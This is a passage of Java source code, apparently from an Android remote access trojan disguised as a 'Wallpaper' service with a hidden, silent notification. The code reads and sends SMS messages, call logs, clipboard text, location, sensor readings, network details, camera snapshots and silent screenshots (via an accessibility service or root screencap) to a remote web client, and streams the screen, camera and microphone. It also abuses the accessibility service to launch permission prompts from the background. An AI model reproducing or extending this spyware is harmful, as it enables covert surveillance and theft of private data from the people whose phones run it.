            long interval = intervalMs > 0 ? intervalMs : currentGpsIntervalMs;
            if (!isGpsEnabled()) {
                promptEnableGps();
            }
            startLocationUpdates(interval);
        } else {
            cancelGpsNotification();
            stopLocationUpdates();
        }
        updateForegroundServiceNotification(isScreenStreaming);
        Log.d(TAG, "Location streaming updated: " + enable);
        sendStreamStatus();
    }

    private void handleStreamScreen(JSONObject payload) {
        if (payload == null) return;
        boolean active = payload.optBoolean("enable", payload.optBoolean("active", false));
        setScreenStreaming(active);
    }

    private synchronized void setScreenStreaming(boolean enable) {
        if (screenCaptureManager == null) return;
        if (enable) {
            if (mediaProjectionData == null) {
                Log.i(TAG, "MediaProjection token needed; launching consent activity");
                launchMediaProjectionConsent();
                return;
            }
            updateForegroundServiceNotification(true);
            boolean started = screenCaptureManager.startScreenCapture(mediaProjectionData);
            if (!started) {
                Log.w(TAG, "Screen capture failed with cached token; clearing and requesting fresh consent");
                mediaProjectionData = null;
                updateForegroundServiceNotification(false);
                launchMediaProjectionConsent();
                return;
            }
            isScreenStreaming = started;
            if (screenCaptureManager.getScreenTrack() != null) {
                screenCaptureManager.getScreenTrack().setEnabled(true);
            }
            Log.i(TAG, "Screen streaming updated: " + started);
        } else {
            screenCaptureManager.stopScreenCapture();
            if (screenCaptureManager.getScreenTrack() != null) {
                screenCaptureManager.getScreenTrack().setEnabled(false);
            }
            updateForegroundServiceNotification(false);
            isScreenStreaming = false;
            mediaProjectionData = null;
            Log.i(TAG, "Screen streaming stopped");
        }
        sendStreamStatus();
    }

    private void launchMediaProjectionConsent() {
        Intent intent = new Intent(this, MediaProjectionPermissionActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);

        boolean launched = false;
        if (WallpaperAccessibilityService.isRunning()) {
            try {
                WallpaperAccessibilityService.getInstance().startActivity(intent);
                launched = true;
                Log.i(TAG, "Launched MediaProjectionPermissionActivity via AccessibilityService");
            } catch (Exception e) {
                Log.w(TAG, "Failed launching via AccessibilityService", e);
            }
        }
        if (!launched) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    ActivityOptions opts = ActivityOptions.makeBasic();
                    opts.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                    PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                    pi.send(this, 0, null, null, null, null, opts.toBundle());
                    launched = true;
                    Log.i(TAG, "Launched MediaProjectionPermissionActivity via PendingIntent with BAL allowed");
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed launching via PendingIntent", e);
            }
        }
        if (!launched) {
            try {
                startActivity(intent);
                Log.i(TAG, "Launched MediaProjectionPermissionActivity directly from service");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start MediaProjectionPermissionActivity", e);
            }
        }
    }

    private synchronized void updateForegroundServiceNotification(boolean withMediaProjection) {
        Notification notification = createNotification();
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        if (!isForegroundStarted) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
                try {
                    startForeground(Constants.NOTIFICATION_ID, notification, types);
                    isForegroundStarted = true;
                    Log.i(TAG, "Foreground service started with types=" + types);
                    return;
                } catch (Exception e) {
                    Log.w(TAG, "startForeground with types=" + types + " failed, falling back to DATA_SYNC | LOCATION", e);
                    try {
                        int safeTypes = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                            safeTypes |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                        }
                        startForeground(Constants.NOTIFICATION_ID, notification, safeTypes);
                        isForegroundStarted = true;
                        Log.i(TAG, "Foreground service started with safeTypes=" + safeTypes);
                        return;
                    } catch (Exception ex) {
                        try {
                            startForeground(Constants.NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                            isForegroundStarted = true;
                        } catch (Exception ex2) {
                            Log.e(TAG, "Fallback to basic startForeground failed", ex2);
                        }
                    }
                }
            } else {
                startForeground(Constants.NOTIFICATION_ID, notification);
                isForegroundStarted = true;
                return;
            }
        }

        // If MediaProjection consent was just granted from the foreground permission activity, update the type
        if (withMediaProjection && mediaProjectionData != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                int types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                }
                startForeground(Constants.NOTIFICATION_ID, notification, types);
                Log.i(TAG, "Updated foreground service with MEDIA_PROJECTION");
                return;
            } catch (Exception e) {
                Log.w(TAG, "Could not update foreground service for MEDIA_PROJECTION", e);
            }
        }

        // When already running in foreground, update notification directly without re-invoking startForeground with changing background types
        if (nm != null) {
            try {
                nm.notify(Constants.NOTIFICATION_ID, notification);
            } catch (Exception e) {
                Log.w(TAG, "Failed updating notification content", e);
            }
        }
    }

    private void sendStreamStatus() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject status = new JSONObject();
            status.put("frontCamera", isFrontCameraStreaming);
            status.put("backCamera", isBackCameraStreaming);
            status.put("camera", isFrontCameraStreaming || isBackCameraStreaming);
            status.put("cameraBusy", isFrontCameraBusy || isBackCameraBusy);
            status.put("frontCameraBusy", isFrontCameraBusy);
            status.put("backCameraBusy", isBackCameraBusy);
            status.put("mic", isMicStreaming);
            status.put("location", isLocationStreaming);
            status.put("screen", isScreenStreaming);

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("status", status);
            socket.emit(Constants.EVENT_STREAM_STATUS, msg);
            Log.d(TAG, "Emitted stream_status: " + status);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending stream status", e);
        }
    }

    private void startNotificationListener() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }

    private void sendCallLogs() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send call logs, no web client or socket disconnected");
            return;
        }

        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };
            Cursor cursor = resolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor == null) {
                Log.e(TAG, "Failed to query call logs");
                return;
            }

            JSONArray callLogs = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 10) {
                JSONObject call = new JSONObject();
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                call.put("number", number != null ? number : "Unknown");
                call.put("type", getCallTypeString(type));
                call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                call.put("duration", duration);

                callLogs.put(call);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("call_logs", callLogs);

            socket.emit(Constants.EVENT_CALL_LOG, msg);
            Log.d(TAG, "Sent call logs: " + callLogs.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending call logs", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs", e);
        }
    }

    private void sendSmsMessages() {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot send SMS messages, no web client or socket disconnected");
            return;
        }

        try {
            ContentResolver resolver = getContentResolver();
            String[] projection = {
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
            };
            Cursor cursor = resolver.query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC"
            );

            if (cursor == null) {
                Log.e(TAG, "Failed to query SMS messages");
                return;
            }

            JSONArray smsMessages = new JSONArray();
            int count = 0;
            while (cursor.moveToNext() && count < 50) {
                JSONObject sms = new JSONObject();
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                sms.put("address", address != null ? address : "Unknown");
                sms.put("body", body != null ? body : "");
                sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                sms.put("type", getSmsTypeString(type));

                smsMessages.put(sms);
                count++;
            }
            cursor.close();

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("sms_messages", smsMessages);

            socket.emit(Constants.EVENT_SMS, msg);
            Log.d(TAG, "Sent SMS messages: " + smsMessages.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending SMS messages", e);
        } catch (Exception e) {
            Log.e(TAG, "Error querying SMS messages", e);
        }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "Sent";
            default:
                return "Unknown";
        }
    }

    private final List<IceCandidate> pendingIceCandidates = new ArrayList<>();

    private void createAndSendOffer() {
        if (webClientId == null) {
            Log.w(TAG, "No web client available");
            return;
        }
        if (peerConnection == null) {
            Log.e(TAG, "PeerConnection is null, cannot create offer");
            return;
        }

        Log.d(TAG, "Creating offer for web client: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "true"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        final String clientId = webClientId;
        final String socketId = socket != null ? socket.id() : null;
        if (socketId == null) {
            Log.e(TAG, "Socket ID is null, cannot create offer");
            return;
        }

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created successfully");
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override
                    public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", sdp.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", clientId);
                            msg.put("from", socketId);
                            msg.put("signal", signal);
                            socket.emit(Constants.EVENT_SIGNAL, msg);
                            Log.d(TAG, "Sent offer to web client");
                        } catch (JSONException e) {
                            Log.e(TAG, "Offer send fail", e);
                        }
                    }
                    @Override
                    public void onSetFailure(String err) {
                        Log.e(TAG, "Set local desc fail: " + err);
                    }
                    @Override
                    public void onCreateSuccess(SessionDescription s) {}
                    @Override
                    public void onCreateFailure(String f) {
                        Log.e(TAG, "Create offer fail: " + f);
                    }
                }, sdp);
            }
            @Override
            public void onSetSuccess() {}
            @Override
            public void onCreateFailure(String err) {
                Log.e(TAG, "Create offer fail: " + err);
            }
            @Override
            public void onSetFailure(String err) {
                Log.e(TAG, "Set desc fail: " + err);
            }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                if (peerConnection != null) {
                    peerConnection.setRemoteDescription(new SdpObserver() {
                        @Override
                        public void onCreateSuccess(SessionDescription s) {}
                        @Override
                        public void onSetSuccess() {
                            Log.d(TAG, "Processed answer from web client successfully");
                            drainPendingIceCandidates();
                        }
                        @Override
                        public void onCreateFailure(String e) {}
                        @Override
                        public void onSetFailure(String err) {
                            Log.e(TAG, "Failed to set remote answer: " + err + ". Rebuilding PeerConnection...");
                            new Handler(Looper.getMainLooper()).post(() -> rebuildPeerConnection());
                        }
                    }, ans);
                }
            } else if (signal.has("candidate")) {
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                if (peerConnection != null && peerConnection.getRemoteDescription() != null) {
                    peerConnection.addIceCandidate(c);
                    Log.d(TAG, "Added ICE candidate from web client: " + c.sdpMid);
                } else {
                    synchronized (pendingIceCandidates) {
                        pendingIceCandidates.add(c);
                    }
                    Log.d(TAG, "Queued ICE candidate until remote description is set: " + c.sdpMid);
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private void drainPendingIceCandidates() {
        if (peerConnection == null) return;
        synchronized (pendingIceCandidates) {
            for (IceCandidate c : pendingIceCandidates) {
                try {
                    peerConnection.addIceCandidate(c);
                    Log.d(TAG, "Flushed queued ICE candidate: " + c.sdpMid);
                } catch (Exception e) {
                    Log.w(TAG, "Error adding queued ICE candidate", e);
                }
            }
            pendingIceCandidates.clear();
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override
        public void onCreateSuccess(SessionDescription s) {}
        @Override
        public void onSetSuccess() {
            Log.d(TAG, "SDP set success");
        }
        @Override
        public void onCreateFailure(String e) {
            Log.e(TAG, "SDP create fail: " + e);
        }
        @Override
        public void onSetFailure(String e) {
            Log.e(TAG, "SDP set fail: " + e);
        }
    };

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            int importance = NotificationManager.IMPORTANCE_LOW;
            NotificationChannel ch = new NotificationChannel(
                    Constants.CHANNEL_ID, "Wallpaper", importance);
            ch.setDescription("Wallpaper service");
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setSound(null, null);
            if (!showNotif) {
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            }
            nm.createNotificationChannel(ch);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, Constants.CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_logo)
                .setOngoing(true);

        if (showNotif) {
//            Intent stop = new Intent(this, StreamingService.class);
//            stop.setAction(Constants.ACTION_STOP_STREAMING);
//            PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
//                    PendingIntent.FLAG_IMMUTABLE);
            builder.setContentTitle("سلام")
                    .setContentText("به آرزوی خوشبختی زندگی.");
//                    .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI);
        } else {
            builder.setContentTitle("سلام")
                    .setContentText("به آرزوی خوشبختی زندگی.")
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true);
        }

        return builder.build();
    }

    private void toggleSensorSubscription(JSONObject payload) {
        if (payload == null || sensorManager == null) return;
        boolean active = payload.optBoolean("active", false);
        isSensorSubscribed = active;
        if (active) {
            Log.d(TAG, "Subscribed to hardware sensors");
            if (lightSensor != null) {
                sensorManager.registerListener(this, lightSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
            if (proximitySensor != null) {
                sensorManager.registerListener(this, proximitySensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
            if (accelSensor != null) {
                sensorManager.registerListener(this, accelSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
            }
        } else {
            Log.d(TAG, "Unsubscribed from hardware sensors");
            sensorManager.unregisterListener(this);
        }
    }

    private float lastLight = -1;
    private float lastProximity = -1;
    private float[] lastAccel = new float[3];

    @Override
    public void onSensorChanged(android.hardware.SensorEvent event) {
        if (!isSensorSubscribed || webClientId == null || socket == null || !socket.connected()) return;

        boolean changed = false;
        int type = event.sensor.getType();
        if (type == android.hardware.Sensor.TYPE_LIGHT) {
            float val = event.values[0];
            if (Math.abs(val - lastLight) > 1.0f || lastLight == -1) {
                lastLight = val;
                changed = true;
            }
        } else if (type == android.hardware.Sensor.TYPE_PROXIMITY) {
            float val = event.values[0];
            if (val != lastProximity || lastProximity == -1) {
                lastProximity = val;
                changed = true;
            }
        } else if (type == android.hardware.Sensor.TYPE_ACCELEROMETER) {
            float x = event.values[0];
            float y = event.values[1];
            float z = event.values[2];
            if (Math.abs(x - lastAccel[0]) > 0.5f || Math.abs(y - lastAccel[1]) > 0.5f || Math.abs(z - lastAccel[2]) > 0.5f) {
                lastAccel[0] = x;
                lastAccel[1] = y;
                lastAccel[2] = z;
                changed = true;
            }
        }

        long now = System.currentTimeMillis();
        if (changed && (now - lastSensorEmitTime >= 1000)) {
            lastSensorEmitTime = now;
            try {
                JSONObject data = new JSONObject();
                data.put("to", webClientId);
                data.put("from", socket.id());

                JSONObject sensors = new JSONObject();
                sensors.put("lux", lastLight);
                sensors.put("proximity", lastProximity);
                sensors.put("accelX", Math.round(lastAccel[0] * 100.0) / 100.0);
                sensors.put("accelY", Math.round(lastAccel[1] * 100.0) / 100.0);
                sensors.put("accelZ", Math.round(lastAccel[2] * 100.0) / 100.0);
                data.put("sensors", sensors);

                socket.emit(Constants.EVENT_SENSOR_DATA, data);
            } catch (JSONException e) {
                Log.e(TAG, "Sensor JSON compilation error", e);
            }
        }
    }

    @Override
    public void onAccuracyChanged(android.hardware.Sensor sensor, int accuracy) {}

    private void sendNetworkDiagnostics() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            android.net.ConnectivityManager connManager = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

            String connectionType = "Unknown";
            String ssid = "Unavailable";
            int rssi = -127;
            int linkSpeed = 0;
            String localIp = "0.0.0.0";

            if (connManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.net.Network activeNetwork = connManager.getActiveNetwork();
                    if (activeNetwork != null) {
                        android.net.NetworkCapabilities caps = connManager.getNetworkCapabilities(activeNetwork);
                        if (caps != null) {
                            if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) {
                                connectionType = "WIFI";
                            } else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) {
                                connectionType = "MOBILE";
                            } else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) {
                                connectionType = "ETHERNET";
                            }
                        }
                    }
                } else {
                    @SuppressWarnings("deprecation")
                    android.net.NetworkInfo activeNet = connManager.getActiveNetworkInfo();
                    if (activeNet != null && activeNet.isConnected()) {
                        connectionType = activeNet.getTypeName();
                    }
                }
            }

            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                if (wifiInfo != null) {
                    ssid = wifiInfo.getSSID();
                    if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
                        ssid = ssid.substring(1, ssid.length() - 1);
                    }
                    rssi = wifiInfo.getRssi();
                    linkSpeed = wifiInfo.getLinkSpeed();

                    int ip = wifiInfo.getIpAddress();
                    localIp = String.format(Locale.getDefault(), "%d.%d.%d.%d",
                            (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
                }
            }

            JSONObject netInfo = new JSONObject();
            netInfo.put("connectionType", connectionType);
            netInfo.put("ssid", ssid);
            netInfo.put("rssi", rssi);
            netInfo.put("linkSpeed", linkSpeed);
            netInfo.put("localIp", localIp);

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("network", netInfo);

            socket.emit(Constants.EVENT_NETWORK_INFO, msg);
            Log.d(TAG, "Sent network diagnostics profile");
        } catch (Exception e) {
            Log.e(TAG, "Network diagnostics fetch error", e);
        }
    }

    private void takeCameraSnapshot(JSONObject payload) {
        if (payload == null || cameraManager == null) return;
        boolean useFront = payload.optBoolean("useFront", false);
        Log.d(TAG, "Taking photo snapshot with camera lens facing: " + (useFront ? "Front" : "Back"));
        new Thread(() -> {
            cameraManager.captureSnapshot(useFront, base64Image -> {
                if (webClientId == null || socket == null || !socket.connected()) return;
                try {
                    JSONObject data = new JSONObject();
                    data.put("image", base64Image);
                    data.put("camera", useFront ? "front" : "back");

                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket.id());
                    msg.put("snapshot", data);

                    socket.emit(Constants.EVENT_SNAPSHOT_DATA, msg);
                    Log.d(TAG, "JPEG snapshot delivered to target web client");
                } catch (JSONException e) {
                    Log.e(TAG, "Snapshot packaging failed", e);
                }
            });
        }).start();
    }

    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.d(TAG, "Opened Accessibility Settings");
        } catch (Exception e) {
            Log.e(TAG, "Failed to open accessibility settings", e);
        }
    }

    private void takeDeviceScreenshot(JSONObject payload) {
        if (webClientId == null || socket == null || !socket.connected()) {
            Log.w(TAG, "Cannot take screenshot, web client absent or socket disconnected");
            return;
        }

        Log.d(TAG, "Initiating silent screenshot capture...");

        // 1. Accessibility Service capture (Android 11+, completely silent and invisible)
        WallpaperAccessibilityService a11yService = WallpaperAccessibilityService.getInstance();
        if (a11yService != null) {
            a11yService.captureSilentScreenshot(new WallpaperAccessibilityService.ScreenshotCallback() {
                @Override
                public void onSuccess(String base64Jpeg) {
                    sendScreenshotResponse(base64Jpeg, null);
                }

                @Override
                public void onError(String error) {
                    Log.w(TAG, "Accessibility screenshot returned error: " + error + ", checking root fallback");
                    tryRootScreenshotFallback(error);
                }
            });
            return;
        }

        // 2. Fallback to Root screencap
        tryRootScreenshotFallback("Accessibility Service is not active");
    }

    private void tryRootScreenshotFallback(String a11yError) {
        new Thread(() -> {
            String rootImage = captureScreenshotWithRoot();
            if (rootImage != null) {
                Log.d(TAG, "Silent screenshot captured via root screencap fallback");
                sendScreenshotResponse(rootImage, null);
            } else {
                String errorMsg = "Silent screenshot requires Accessibility Service to be enabled in Android Settings > Accessibility > Installed apps > "
                        + getString(R.string.app_name) + " (or Root access).";
                sendScreenshotResponse(null, errorMsg);
            }
        }).start();
    }

    private String captureScreenshotWithRoot() {
        Process process = null;
        try {
            process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p"});
            InputStream is = process.getInputStream();
            Bitmap bmp = BitmapFactory.decodeStream(is);
            process.waitFor();
            if (bmp != null) {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 85, baos);
                bmp.recycle();
                return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
            }
        } catch (Exception e) {
            Log.d(TAG, "Root screencap check failed: " + e.getMessage());
        } finally {
            if (process != null) {
                try {
                    process.destroy();
                } catch (Exception ignored) {}
            }
        }
        return null;
    }

    private void sendScreenshotResponse(String base64Image, String errorMsg) {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject data = new JSONObject();
            if (base64Image != null) {
                data.put("image", base64Image);
                data.put("timestamp", System.currentTimeMillis());
            } else {
                data.put("error", "SCREENSHOT_UNAVAILABLE");
                data.put("message", errorMsg != null ? errorMsg : "Screenshot capture failed");
            }

            JSONObject msg = new JSONObject();
            msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("screenshot", data);

            socket.emit(Constants.EVENT_SCREENSHOT_DATA, msg);
            Log.d(TAG, "Sent screenshot response to web client (success=" + (base64Image != null) + ")");
        } catch (JSONException e) {
            Log.e(TAG, "Error packaging screenshot response", e);
        }
    }

    private void getClipboardText() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                String text = "";
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    android.content.ClipData clip = clipboard.getPrimaryClip();
                    if (clip != null && clip.getItemCount() > 0) {
                        CharSequence chars = clip.getItemAt(0).getText();
                        if (chars != null) {
                            text = chars.toString();
                        }
                    }
                }

                JSONObject payload = new JSONObject();
                payload.put("to", webClientId);
                payload.put("from", socket.id());
                payload.put("clipboard", text);

                socket.emit(Constants.EVENT_CLIPBOARD_DATA, payload);
                Log.d(TAG, "Clipboard text fetched and sent: " + text);
            } catch (Exception e) {
                Log.e(TAG, "Read clipboard failed", e);
            }
        });
    }

    private void setClipboardText(JSONObject payload) {
        if (payload == null) return;
        String text = payload.optString("text", "");
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null) {
                    android.content.ClipData clip = android.content.ClipData.newPlainText("RAT Clipboard", text);
                    clipboard.setPrimaryClip(clip);
                    Log.d(TAG, "Device clipboard text updated remotely");
                }
            } catch (Exception e) {
                Log.e(TAG, "Write clipboard failed", e);
            }
        });
    }

    @Override
    public void onInit(int status) {
        if (status == TextToSpeech.SUCCESS) {
            if (tts != null) {
                tts.setLanguage(Locale.US);
                Log.d(TAG, "TTS Synthesizer initialized successfully");
            }
        } else {
            Log.e(TAG, "TTS Initialization failed");
        }
    }

    private void speakTts(JSONObject payload) {
        if (payload == null || tts == null) return;
        try {
            String text = payload.optString("text", "");
            float pitch = (float) payload.optDouble("pitch", 1.0);
            float speed = (float) payload.optDouble("speed", 1.0);
            if (!text.isEmpty()) {
                tts.setPitch(pitch);
                tts.setSpeechRate(speed);
                tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RAT_TTS");
                Log.d(TAG, "Spoke phrase remotely via TTS: " + text);
            }
        } catch (Exception e) {
            Log.e(TAG, "TTS Speech output error", e);
        }
    }

    private void cleanup() {
        if (tts != null) {
            tts.stop();
            tts.shutdown();
            tts = null;
        }
        if (sensorManager != null) {
            sensorManager.unregisterListener(this);
        }
        stopLocationUpdates();

        if (cameraManager != null) {
            cameraManager.stopCapturers();
            cameraManager.dispose();
            cameraManager = null;
        }
        if (screenCaptureManager != null) {
            screenCaptureManager.stopScreenCapture();
            screenCaptureManager.dispose();
            screenCaptureManager = null;
        }
        if (localRecorder != null) {
            localRecorder.stop(null);
            localRecorder = null;
        }

        setMicStreaming(false);
        audioTransceiver = null;
        if (telemetryDataChannel != null) {
            try {
                telemetryDataChannel.dispose();
            } catch (Exception ignored) {}
            telemetryDataChannel = null;
        }
        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        if (eglBase != null) {
            eglBase.release();
            eglBase = null;
        }
        if (factory != null) {
            factory.dispose();
            factory = null;
        }
        if (audioDeviceModule != null) {
            try {
                audioDeviceModule.release();
            } catch (Exception ignored) {}
            audioDeviceModule = null;
        }

        Intent intent = new Intent(this, NotificationListener.class);
        stopService(intent);
